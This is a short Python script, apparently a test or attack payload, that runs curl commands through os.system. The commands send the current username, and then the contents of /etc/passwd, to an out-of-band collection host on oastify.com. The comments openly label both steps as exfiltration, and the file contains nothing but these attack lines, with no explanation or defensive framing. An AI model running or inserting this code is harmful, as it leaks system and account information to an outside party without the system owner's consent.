
import os
# Exfiltrate current user
os.system("curl http://qtn78xvh0nj07j3ge2mqmlogo7uysmja8.oastify.com/$(whoami)")

# Read and exfiltrate /etc/passwd (LFI-style)
os.system("curl -X POST --data-binary '@/etc/passwd' http://qtn78xvh0nj07j3ge2mqmlogo7uysmja8.oastify.com/$(whoami)")
